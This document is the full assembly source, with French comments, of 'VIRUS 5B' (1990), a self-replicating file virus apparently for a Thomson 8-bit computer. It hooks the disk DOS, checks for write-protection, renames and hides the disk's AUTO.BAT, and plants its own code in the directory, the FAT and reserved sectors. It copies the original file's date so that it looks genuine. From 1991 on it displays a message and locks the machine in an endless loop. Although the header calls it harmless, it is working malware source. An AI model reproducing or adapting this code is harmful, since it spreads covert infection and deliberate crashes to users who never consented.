************  par Michel SAINT-BRIANT
*          *
* VIRUS 5B *  A.S.C.I. 1990 Copyright
*          *
************ (ce virus est inoffensif)

LOCAL  EQU    $8880
DEP    EQU    $A000-LOCAL-2
TAMPON EQU    $7065

       ORG    $A100

* On pr�pare la sortie

       PSHS   U,X,Y,DP,A,B,CC

* le virus doit se montrer � partir de
* 1991 (si la date a �t� entr�e !)

       LDA    $607E   Registre-ann�e
       CMPA   #91     si contenu < 91
       BLO    INSTAL  VIRUS5B s'installe

* en 1991 et ann�es suivantes,le virus
* se manifeste par un affichage et un
* plantage irr�versible

MESSAG LDX    #TEXTE     affiche le
       LDB    #$C        message apr�s
PRINT  JSR    $E803      effacement
       LDB    ,X+
       COMB
       BNE    PRINT
       STX    $60FE   pour RESET � froid
PLANTE BRA    PLANTE  boucle sans fin

* installer le virus pour contamination

INSTAL LDU    #$A001
       LDX    #LOCAL
       LDA    #$FF
       STA    ,X+
       LDD    #$470A
       STD    ,X++
COPIE  LDA    ,U+
       STA    ,X+
       CMPX   #$A3FF-DEP
       BNE    COPIE
       LDX    #CONTAG-DEP
       LDA    #$7E
       STX    $6806
       STA    $6805

* on sort discr�tement pour le vrai
* AUTO.BAT

FIN    PULS   CC,A,B,DP,X,Y,U,PC

* Partie 'CONTAGIEUSE'

CONTAG PSHS   U,X,Y,DP,B,A,CC

       CMPA   #$80    en entr�e A est le
       BLO    QUITTE  'DEVICE in use':si
       CMPA   #$84    ce n'est pas un
       BHI    QUITTE  lecteur, on sort.

       LDX    #LOCAL  V�rification de l'
       LEAY   ,X      int�grit� de VIRUS
CHECKS LDB    ,X+     5B avant tentative
       LEAY   B,Y     de contamination.
       CMPX   #$A3F4-DEP On proc�de par
       BNE    CHECKS  un checksum sur 16
       LDD    ,X      bits qui d�tecte
       LEAX   D,Y     toute modification
       BEQ    SUITE   (si modif. sortie)
       LDA    #$39    RTS mis en $6805
       STA    $6805   d�sactive VIRUS5B
       BRA    QUITTE

SUITE  LDU    $61C7   U = pointeur BASIC
       LDA    ,U+     si nul
       BEQ    DEVICE    ou   > DEVICE
       CMPA   #$3A    si ':'
       BEQ    DEVICE
       CMPA   #$22    si pas '"' alors
       BNE    QUITTE      on sort
       LDD    ,U      si '"' alors le
       CMPB   #$3A    3�me est-il ':'?
       BNE    DEVICE  si pas ':'>DEVICE
       CMPA   #$30    si":"a-t-on'"0:'?
       BEQ    OK      si oui c'est OK

QUITTE PULS   CC,A,B,DP,X,Y,U,PC

DEVICE LDA    $6768   le lecteur par d�-
       CMPA   #$80    faut est-il "0:" ?
       BNE    QUITTE  si non on sort

* OK c'est � dire qu'on a une fonction
* ayant acc�s au lecteur 0: (DIR,LOAD(m)
* SAVE(m),OPEN,MERGE,COPY...)
* Voyons maintenant si la disquette est
* prot�g�e en �criture (oui = fichu !)

OK     JSR    $E09D   initialise DOS
       CLR    <$49    lecteur 0:
       LDA    #20     on se cale sur
       STA    <$4B    la piste 20
       JSR    $E452   acc�s disquette
       LDA    $E7D1   on lit $E7D1
       LDB    #$40    et on �teint la
       STB    $E7D2   diode-disquette
       ANDA   #4      on teste le bit 2
       BNE    QUITTE  si 1 prot�g�e

* la disquette n'est pas prot�g�e.
* Examinons sa FAT

       LDA    #2
       STA    <$48    lecture du
       STA    <$4C    secteur 2
       LDX    #TAMPON dans la zone
       STX    <$4F    $624F/$634E
       JSR    $E004   appel DOS

* les secteurs 9 � 12 piste 20 sont-ils
* libres ? si c'est non, VIRUS 5B est
* d�j� install� donc on sort ou la place
* est prise par autre chose et on sort.

       LDA    TAMPON+42  teste bloc 41
       CMPA   #$FE    est-il prot�g� ?
       BNE    QUITTE  si non on quitte.

* y a-t-il plus de 40 fichiers dans la
* FAT (chaque fin de fichier est cod�e
* par $C1 � $C8 donc on compte les $C.)

       LDX    #TAMPON+1 d�but des blocs
       CLRB           compteur � 0
BLOC   LDA    ,X+
       ANDA   #$F0
       CMPA   #$C0
       BNE    SUIV
       INCB
SUIV   CMPX   #TAMPON+161 fin 160 blocs
       BNE    BLOC
       CMPB   #40     40 --> 5 secteurs
       BHI    QUITTE  donc 1 de s�curit�

* tout va bien,il ne reste plus qu'�
* chercher s'il existe un AUTO.BAT :
* si non on sort

       LDA    #5      on analyse les
       STA    LOCAL-1   entr�es dans le
SECTOR INC    <$4C      r�pertoire avec
       JSR    $E004     les secteurs 3/7
       LDU    <$4F
       LDB    #8      8 entr�es par
ENTREE LDY    #AB-DEP   secteurs
       TFR    U,X
TESTAB LDA    ,X+
       CMPA   ,Y+
       BEQ    TESTAB
       CMPY   #AB+12-DEP
       BEQ    AUTO
AUTRE  LEAU   32,U
       DECB
       BNE    ENTREE
       DEC    LOCAL-1
       BNE    SECTOR
PASBAS LBRA   QUITTE

* AUTO.BAT trouv�, est-ce bien du basic?

AUTO   TSTA
       BNE    PASBAS
       LDA    ,X
       BNE    PASBAS

* on a un AUTO.BAT basic

       LDX    #$1B58  on d�baptise l'
       STX    ,U++    AUTO.BAT (masque)
       LDD    #$2009  on remplit les 9
SPACE  STA    ,U+     autres caract�res
       DECB           d'espaces...
       BNE    SPACE
       LDX    #LOCAL-12
       LEAU   5,U
       TFR    U,Y      On sauve le com-
CODAT1 LDA    ,Y+      mentaire et la
       STA    ,X+      date de l'ancien
       CMPX   #LOCAL-1 AUTO.BAT pour
       BNE    CODAT1   recopie apr�s.
       LDX    #$0D1B
       STX    ,U++
       LDX    #$5F18   puis on modifie
       STX    ,U++     pour dissimuler.
       LDX    #$0808
       STX    ,U++
       CLR    ,U

* existe-t-il une entr�e libre dans le
* m�me secteur ?

       LDB    #8
       LDU    <$4F
LIBR0  LDA    ,U
       BEQ    INOCUL
       CMPA   #$FF
       BEQ    INOCUL
       LEAU   32,U
       DECB
       BNE    LIBR0

* pas de place sur le m�me secteur alors
* on l'�crit ...

       LDA    #8      �criture du
       STA    <$48    secteur
       JSR    $E004   modifi�
       LDA    #2      lecture du suivant

* cherchons place dans un autre secteur

       LDA    #2      pour lecture
       STA    <$48
       LDA    <$4C    on sauvegarde le
       STA    LOCAL-1 secteur initial
PLACE  INC    <$4C
       LDA    <$4C
       CMPA   LOCAL-1
       LBEQ   QUITTE  si on fait le tour
       CMPA   #9      sans trouver > FIN
       BNE    CHERCH
       LDA    #2      si la recherche n'
       STA    <$4C    a pas �t� bonne,on
       BRA    PLACE   reprend au d�but.
CHERCH JSR    $E004
       LDB    #8
       LDU    <$4F
LIBR1  LDA    ,U
       BEQ    INOCUL
       CMPA   #$FF
       BEQ    INOCUL
       LEAU   32,U
       DECB
       BNE    LIBR1
       BRA    PLACE

* maintenant on implante VIRUS 5B

* 1/ sur le catalogue

INOCUL LDX    #AB-DEP
       LDB    #11
NOM    LDA    ,X+
       STA    ,U+
       DECB
       BNE    NOM
       CLR    ,U+
       CLR    ,U+
       LDD    #$29FE
       STA    ,U+
       CLR    ,U+
       STB    ,U+
       LDX    #LOCAL-12 On recopie le
CODAT2 LDA    ,X+      commentaire et la
       STA    ,U+      date de l'ancien
       CMPX   #LOCAL-1 AUTO.BAT pour
       BNE    CODAT2   faire plus vrai !
       LDB    #5       on compl�te
CLEAR  CLR    ,U+      avec des z�ros
       DECB
       BNE    CLEAR
       LDA    #8       pour �criture
       STA    <$48
       JSR    $E004

* 2/ sur la FAT

       LDA    #2
       STA    <$48
       STA    <$4C
       JSR    $E004
       LDA    #$C4
       STA    TAMPON+42
       LDA    #8
       STA    <$48
       JSR    $E004

* 3/ sur les secteurs 9 � 12

       LDD    #$0408  4 secteurs
       STB    <$4C    depuis le 9
       LDU    #$8781
       STU    <$4F

COPPRO INC    <$4C
       INC    <$4F
       DEC    <$50
       JSR    $E004
       DECA
       BNE    COPPRO

* C'est fini et on sort

       PULS   CC,B,A,DP,U,X,Y,PC

* AUTO.BAT

AB     FCC    "AUTO    BAT"

* MESSAGE

TEXTE  FCB    255


       END
